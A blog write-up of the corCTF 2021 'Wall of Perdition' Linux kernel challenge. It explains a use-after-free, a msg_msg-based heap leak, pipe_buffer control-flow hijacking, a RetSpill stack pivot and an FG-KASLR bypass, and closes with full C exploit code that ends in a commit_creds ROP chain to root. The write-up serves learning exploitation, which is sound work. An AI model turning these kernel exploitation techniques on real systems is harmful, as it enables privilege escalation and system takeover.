---
title: "Wall of Perdition: Msgmsg Link and Leak"
date: 2024-05-27 17:37:00
tags: 
layout: default
---

# 0x00 Introduction
To practice kernel exploitation, I plan to solve old CTF challenges and learn different skills from others. Basically, I'll try to solve it by myself and then learn others' solutions. This is the first challenge for this serial, hope it's not the last one. 


# 0x01 Challenge

[Attachment][1]

This is a kernel challenge from corCTF 2021. 

You can also check the [write-up][2] from the challenge authors.

Reversing is kind of verbose in this challenge, if you don't want to do that just check the source code from the authors' writeup. 

Basic information about the kernel: 
```f
KASLR, FG-KASLR, SMEP, SMAP, KPTI
CONFIG_STATIC_USERMODEHELPER+CONFIG_STATIC_USERMODEHELPER_PATH=''
```

The challenge is using SLAB instead of SLUB so freelist hijacking is much more complex. There are several basic features in the challenge kernel model: `add_rule`, `delete_rule`, `edit_rule`, and `dup_rule`. Each `rule` is a 0x40 heap object:

```c
typedef struct
{
    char iface[16];
    char name[16];
    uint32_t ip;
    uint32_t netmask;
    uint16_t proto;
    uint16_t port;
    uint8_t action;
    uint8_t is_duplicated;
} rule_t;
```

We can control most parts of the object by `add/edit`_ing the rules. The vulnerability is in `delete_rule`, which `kfree` the target objects without zero_ing the duplicated pointers. Based on this, we can create a UAF pointer by `dup_rule(0,0)` and `delete_rule(0,0)`.


I divided the whole write-up into three parts and each part solves an individual problem I encountered.

- Arbitrary Address Read
- Hijack the Control Flow and ROP
- Bypass FG-KASLR


# 0x02 Arbitrary Address Read

When we are attacking small objects, we may not have good candidates to leak. The most common objects used to leak is [struct msg_msg][6] and [struct msg_msgseg][7]


```c
struct msg_msg {
	struct list_head m_list;
	long m_type;
	size_t m_ts;		/* message text size */
	struct msg_msgseg *next;
	void *security;
	/* the actual message follows immediately */
};

struct msg_msgseg {
	struct msg_msgseg *next;
	/* the next part of the message follows immediately */
};
```

I also talked the basic usages of `msg_msg` in [IPS][8]. We know that there are limits while using `msg_msg` and `msg_msgseg` to leak: 
- `msg_msg`: If we can't partially write the `next` pointer, we may point `next` to an invalid address. 
- `msg_msgseg`: In the case of `UAF-Refill`, if we can't find an object starting with 0x8 zero bytes. The broken chain will lead to a crash.


For this challenge, there is no `read` feature. And the `UAF-Write` can't partially write the metadata. Also, for `msg_msgseg`, if it's larger than 0x1ff, we can use `sk_buff`. However, due to the objection size(0x40) limit, I didn't find a good object including 8 zero bytes at the head. 

Nevertheless, I found the challenge allows arbitrary write for freed objects, which means we are able to create 8 zero bytes! 
Utilizing the linked-list pointers in `struct msg_msg`. I have a way to leak current some heap pointers:

![msg_msg Link and Leak](/Figures/WallofPerdition/msg_msgLink.png)

## Msgmsg Link and Leak Steps
- 1. Assume the size of our target objects is 0x40
- 2. UAF the target object to create a 0x40 UAF slot 
- 3. Create a `0xfd0+0x38` `msg_msg` object to make sure its `msg_msgseg` refills the freed target object in the previous step 
- 4. UAF-Free the target object again to create a 0x40 UAF slot at the same place as the second step
- 5. Refill with `msg_msg` struct(in a new `msg_msg` queue)
- 6. The `msg_msg` struct we created in the previous step is a fake `msg_msgseq` of the `msg_msg` struct we created in step 3
- 7. Prepare another UAF slot by attacking the challenge vulnerability again
- 8. Append a new `msg_msg` struct to the `msg queue` we created in step 5. 
- 9. The `msg_msg` struct in step 8 will refill the slot we created in step 7
- 10. To avoid crashing while leaking, we UAF free the slot we created in step 7 then refill it with objects starting with 8 zero bytes (e.g., msg_msgseg)
- 11. So we can do msg_peek on the msg_msg struct created in step 3 we can leak the metadata of the `msg_msg` struct we created in step 3

![Step 1-3](/Figures/WallofPerdition/msg_msgLink_step_1-3.png)

![Step 4](/Figures/WallofPerdition/msg_msgLink_step_4.png)

![Step 5-9](/Figures/WallofPerdition/msg_msgLink_step_5-9.png)

![Step 10-11](/Figures/WallofPerdition/msg_msgLink_step_10-11.png)

## Arbitrary Address Read

With the Link and Leak skill in the previous section, we are able to leak the data on the blue msg_msg struct, including a heap pointer to the red `msg_msgseg`(fake) object, which is also an `msg_msg` object on the blue `msg_msg` queue. So we can UAF-Write(edit-rule in the challenge) the red `msg_msgseg` object to fake a msg_msgseg. With this primitive, we can leak almost all the address space as long as there are 8 zero bytes before the stuff we want to leak (their offset should be less than 0xff8). Therefore, we can leak some kernel code segment pointers to compute `kernel.text`.


# 0x03 Hijack the Control Flow and ROP

After leaking the addresses, it's hijack the `$RIP` with UAF-Write. I chose the `ops` pointer in the `pipe_buffer` object:

- I created a UAF slot and refilled it with `pipe_buffer`
- Use UAF Write(edit-rule in the challenge) to set the `ops` pointer to the kernel heap area
- Spray to hit the pointer we set in the previous setting
- Operate the `pipe` to trigger the Control Flow Hijacking

However, the kernel in this challenge is kind of small (4.0M) compared to normal kernel bzImage. The kernel booting is very fast but we can find fewer gadgets to gain more control(ROP). By searching the keyword, `rsp` I didn't find any working gadgets like `push rsi; pop rsp` or `mov rsp, [rsi+<num>]`. After trying other gadgets for long time, I have to learn some new skills from Kyle to bridge the gap (`RIP Control -> ROP`): [RetSpill][3].

The basic idea is we have our userspace date on the stack while doing syscalls. I tained all the registers and found they are at the bottom of the stack segment, which means we can use the gadgets `add rsp, <num>; ret` to pivot the stack. However, I can't find a useful gadget in the kernel. There are only 20 gadgets close to the target area but none of them works: the best one in them can only increase the stack `~0xd0` bytes which is far away from our target `~0x140` bytes.


At the time when I thought this idea died, I got the idea of using `ret <num>` to nudge the stack. Since the compilers usually use `rbp` instead of `rsp` to locate the variables on the stack, the misalignment should not crash! After searching for such gadgets, I found many more gadgets than `add rsp, <num>`. (~20 vs. 200+). The idea of retSpill is really cool and the skill to use `ret <num>` makes it much stronger! Also, what a coincidence, `ret` is in the name of `retSpill`!

I was so excited about this finding and told Kyle this "amazing finding". He told me [he noticed that]. Oops, but the good news is it's not mentioned in the paper and I can still announce I found this beautiful finding independently, LoL! Now I am one of the few people in the world who knows this skill!

# 0x04 Bypass FG-KASLR

This step is actually now hard if you know the basics of FG-KASLR:
- It only randomizes sections starting with `.text`
- There are `SHF_ALLOC` and `SHF_EXECINSTR` in section flags


```c
struct kernel_symbol {
    int value_offset;
    int name_offset;
    int namespace_offset;
};
```

The basic way to bypass it is based on `__ksymtab` section, which records the offset between the functions and its `__ksymtab` entries. The `__ksymtab` struct includes `value_offset` and the address of function XxX is `=&__ksymtab_XxX + __ksymtab_XxX.value_offset`.


People usually use two ways to leak the randomized function addresses:
- Use arbitrary address read 
- Use ROP to load the metadata and do the math

I was too lazy to create a `real` arbitrary address read (msg_msg leak is not a real arbitrary address since it requires a p64(0)) so I created a `FG-KASRL`-free ROP chain to leak the correct functions addresses.

All the problems are solved.

# 0x05 Exploitation

```python
//gcc main.c -o ./main -lx -w
#include "libx.h"
#if defined(LIBX)
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    size_t back2root = shell;
    void back2userImp(){
        __asm__("mov rax, user_ss;"
            "push rax;"
            "mov rax, user_sp;"
            "push rax;"
            "mov rax, user_rflags;"
            "push rax;"
            "mov rax, user_cs;"
            "push rax;"
            "mov rax, back2root;"
            "push rax;"
            "swapgs;"
            "push 0;"
            "popfq;"
            "iretq;"
            );
    }
    // int sk_skt[SOCKET_NUM][2];
    int pipe_fd[PIPE_NUM][2];
    void libxInit(){
        back2user = back2userImp;
        hook_segfault();
        saveStatus();
        // initSocketArray(sk_skt);
        initPipeBuffer(pipe_fd);
    }
#endif // 
size_t pivot, target_heap;
u64  addr_kstrtab_commit_creds = 0xffffffff81b4fc04;
void tainRegs(u64 base,u64 heap){
    
    pivot = 0xffffffff810043cf - NO_ASLR_BASE + base; 
    target_heap = heap + 0x10e00;
    pivot = (pivot << 0x8) + 0xff;
    target_heap = (target_heap << 0x8) + 0xff;

    __asm__("mov rax, 0x9999999999999999;"
    "mov rbx, 0x9999999999999999;"
    "mov rcx, 0x9999999999999999;"
    "mov rdx, 0x9999999999999999;"
    "mov rdi, 0x9999999999999999;"
    "mov rsi, 0x9999999999999999;"
    "mov r8,  0x9999999999999999;"
    "mov r9,  0x9999999999999999;"
    "mov r10, 0x9999999999999999;"
    "mov r11, 0x9999999999999999;"
    "mov r12, 0x9999999999999999;"
    "mov r13, 0x99999999999999ff;"
    "mov r14, target_heap;"
    "mov r15, pivot;"
    "leave;"
    "ret;");
}
typedef struct payload{
    char iface[0x10];
    char name[0x10];
    char ip[0x10];
    char mask[0x10];
    uint8_t idx;
    uint8_t rule_type;
    int16_t proto;
    int16_t port;
    uint8_t action;
    uint8_t unk;
} pay;
int fd = 0;
void add(size_t rule_type,size_t idx,char *ip, char *mask){
    pay * ptr = calloc(1,sizeof(pay));
    memcpy(ptr->ip,ip,0x10);
    memcpy(ptr->mask,mask,0x10);
    ptr->idx = idx;
    ptr->rule_type = rule_type;
    
    ioctl(fd,0x1337babe,ptr);
    free(ptr);
};
void del(size_t rule_type,size_t idx){
    pay * ptr = calloc(1,sizeof(pay));
    ptr->idx = idx;
    ptr->rule_type = rule_type;
    ioctl(fd,0xdeadbabe,ptr);
    free(ptr);
};
void duplicate(size_t rule_type,size_t idx){
    pay * ptr = calloc(1,sizeof(pay));
    ptr->idx = idx;
    ptr->rule_type = rule_type;
    ioctl(fd,0xbaad5aad,ptr);
    free(ptr);
};
void edit(size_t rule_type,size_t idx,__u8 * payload){

    pay * ptr = calloc(1,sizeof(pay));
    memcpy(ptr,payload,0x20);
    char * ip   = calloc(1,0x10+1);
    char * mask = calloc(1,0x10+1);
    size_t cur = 0;
    for(int i = 0 ; i < 4 ; i++){
        __u8 tmp = (__u8)payload[i+0x20];
        u64 nb = 0 ;
        if(i ==3)
            nb = sprintf(&ip[cur],"%d",tmp);
        else
            nb = sprintf(&ip[cur],"%d.",tmp);
        cur+= nb;

    }

    cur = 0;
    for(int i = 0 ; i < 4 ; i++){
        __u8 tmp = payload[i+0x24];
        u64  nb = 0 ;
        if(i ==3)
            nb = sprintf(&mask[cur],"%d",tmp);
        else
            nb = sprintf(&mask[cur],"%d.",tmp);
        cur+= nb;
    }
    memcpy(ptr->ip,ip,0x10);
    memcpy(ptr->mask,mask,0x10);
    ptr->idx = idx;
    ptr->rule_type = rule_type;
    memcpy(&ptr->proto,payload+0x28,2);
    memcpy(&ptr->port,payload+0x2a,2);
    memcpy(&ptr->action,payload+0x2c,1);
    ioctl(fd,0x1337beef,ptr);
    free(ptr);
};
void sprayROPChain(u64 base,u64 heap_addr){
    u64 rdi                 = 0xffffffff8100447c- NO_ASLR_BASE + base;
    u64 ret                 = rdi + 1;
    


    u64 code_addr = heap_addr;
    u64 * rop = calloc(1,0x1000);
    int idx = 0;
    for(int i = 0 ; i < 0xe00/8 ; i++)
        rop[idx++] = ret;
    
    // GET ROOT
    rop[idx++]  = rdi;
    rop[idx++]  = 0xffffffff81c33060    - NO_ASLR_BASE + base;
    // commit_creds
    // pop rax ret
    rop[idx++]  = 0xffffffff81001431 - NO_ASLR_BASE + base;
    rop[idx++]  = addr_kstrtab_commit_creds  - NO_ASLR_BASE + base;
    // 0xffffffff8100f1ed: mov eax, eax; ret;
    rop[idx++]  = 0xffffffff8100f1ed - NO_ASLR_BASE + base;
    // pop rbx ; ret
    rop[idx++]  = 0xffffffff810043d0 - NO_ASLR_BASE + base;
    rop[idx++]  = addr_kstrtab_commit_creds - NO_ASLR_BASE + base;
    // 0xffffffff8100fd91: add eax, ebx; pop rbx; pop rbp; ret;
    rop[idx++]  = 0xffffffff8100fd91 - NO_ASLR_BASE + base;
    rop[idx++]  = 0;
    rop[idx++]  = 0;
    // 0xffffffff81010f3b: 0xffffffff81010f3b: pop rsi; pop rbp; ret;
    rop[idx++]  = 0xffffffff81010f3b - NO_ASLR_BASE + base;
    rop[idx++]  = code_addr+idx*8+0x18+0x30;
    rop[idx++]  = 0;
    // 0xffffffff8100f518: mov [rsi], eax; ret;
    rop[idx++]  = 0xffffffff8100f518- NO_ASLR_BASE + base;
    // This is the data be modified
    rop[idx++]  = 0xffffffffdeadbeef- NO_ASLR_BASE + base;
    rop[idx++]  = 0xffffffff81200df0+22 - NO_ASLR_BASE + base;
    rop[idx++]  = 0 ; 
    rop[idx++]  = 0 ;
    rop[idx++]  = shell;
    rop[idx++]  = user_cs;
    rop[idx++]  = user_rflags;
    rop[idx++]  = user_sp;
    rop[idx++]  = user_ss;
    assert(idx<0x200-0x6);
    msgSpray(0xfd0,0x20,rop);
}
void ControlRIP(u64 base,u64 heap){
    tainRegs(base,heap);
    write(pipe_fd[0][0],"n",1);
    write(pipe_fd[0][1],"1",1);
    write(pipe_fd[1][0],"3",1);
    write(pipe_fd[1][1],"2",1);
}
int main(){
    libxInit();
    void * trivial_data = calloc(1,0x2000);
    int mq[0x10];
    for(int i = 0 ; i<0x10;i++)
        mq[i] = msgGet();
    
    fd = open("/dev/firewall",2);
    msgSend(mq[0xd],0xfd0,calloc(1,0xfd0));
    // Prepare: Drain 0x40
    msgSpray_t *x1 = msgSpray(0x10,0x240,dp('h',0x10));
    // Create Msg-Chain    
        // Create 3 UAF slots
        add(0,0,"255.255.255.1","255.255.255.255");
        add(0,1,"255.255.255.2","255.255.255.255");
        add(0,2,"255.255.255.3","255.255.255.255");
        duplicate(0,0);
        duplicate(0,1);
        duplicate(0,2);
            // Here we need to keep one more ptr for s0 at position(1,3)
            del(0,0);
            add(0,0,"255.255.255.1","255.255.255.255");
            duplicate(0,0); //  > 1,3 
        // Free s0
        del(0,0);
        msgSend(mq[0], 0xfd0+0x38, trivial_data);
        // Create a msg_msg obj as the prev (which one we gonna leak)
        msgSend(mq[1],0x10,dp(' ',0x10));
        // UAF free s0
        del(1,0);
        // Refill s0
        msgSend(mq[1],0x10,dp('0',0x10));
        // Free s1 and refill 
        del(0,1);
        msgSend(mq[1],0x10,dp('1',0x10));
        // fengshui
        msgSend(mq[0xf],0xfd0,dp('o',0x1008));
        // UAF free s1 and refill to make sure it starts with p64(0)
        msgRecv(mq[0xd],1);
        del(1,1);
        msgSend(mq[2],0xfd0+0x38,dp('i',0x1008));
    // Leak Heap 
    msgMsg * res = msgPeek(mq[0],0x2000);
    u64 *ptr = res->mtext;
    u64 ct = 0xfd0/8;
    u64 leaked = ptr[ct];
    u64 current_page = leaked >> 12 << 12;
    warn(hex(leaked));
    // AAR
    del(1,3);
    add(1,3,"255.255.255.1","255.255.255.255");
    duplicate(1,3); // > 0,0
    del(1,3); // Free slot 0
    msgSend(mq[3],0x10,dp('9',0x10));

    // Spawn an AAR Target;
    del(0,2);
    pipeBufferResize(pipe_fd[0][0],1);
    pipeBufferResize(pipe_fd[1][0],1); // Improve the success rate from 50% to 66%

    // Leak Code Base    
    u64 msg_struct[8] = {0,0,0x800,0xfd0,0,0,0,0};
    u64 *pay = flatn(msg_struct,8);
    edit(0,0,pay);
    res     = msgPeek(mq[3],0xfd0);
    ptr     = res->mtext;
    size_t code = 0 ;
    size_t tmp_data[8] = {0};
    for( int i = 2 ; i < (0xfd0)/8 - 4; i+=8 )
    {
        if( (ptr[i+2]  & 0xfff)==0xd00)
        {
            code  = ptr[i+2];
            memcpy(tmp_data,&ptr[i],0x40);
            break;
        }            
    }
    if(code==0)
        panic("Failed to leak Code (chance -> 1/3+1/2 = 5/6)");
    u64 base = code - (0xffffffff81a0ed00-0xffffffff81000000);
    info("Leaked Code Address: ");
    warn(hex(base));


    // Hijack pipe_buffer->op
    info("Current Heap: ");
    warn(hex(current_page));
    tmp_data[2] = current_page + 0x3330;
    edit(1,2,tmp_data);
    
    // Spray Fake op objects
    u64 RIP = 0xffffffff8100964c - NO_ASLR_BASE + base; // 0xffffffff8100964c: ret 0x149;
    u64 * spray = calloc(1,0x1000);
    for(int i = 0 ; i< 0x200 ; i ++)
        spray[i] = RIP; // READ/WRITE, whoes stack fram == 0x58
    u64 victim = current_page+0x10e00;
    for(int i = 4 ; i < 0x8 ;i ++)
        msgSend(mq[i],0xfd0,spray);
    sprayROPChain(base,victim-0xe00);
    // debug();
    ControlRIP(base,current_page);
}
```

# Epilogue

- Created a method to leak with `msg_msg` + `UAF Free` on small objects: msg_msg Link and Leak
- Found `ret 0x.*` skill for RetSpill
- Learned RetSpill/FG-KASLR Bypassing
- Practiced Kernel Exploitation

TODO:
- Reproduce the author's methods (msg_msg aar/aaw)
- Know more about FG-KASLR



[1]: TODO
[2]: https://syst3mfailure.io/wall-of-perdition/
[3]: https://dl.acm.org/doi/abs/10.1145/3576915.3623220
[4]: https://github.com/sefcom/RetSpill/blob/main/igni/chain_builder.py#L97
[6]: https://elixir.bootlin.com/linux/latest/source/include/linux/msg.h#L9
[7]: https://elixir.bootlin.com/linux/latest/source/ipc/msgutil.c#L37
[8]: https://n132.github.io/2024/02/09/IPS.html
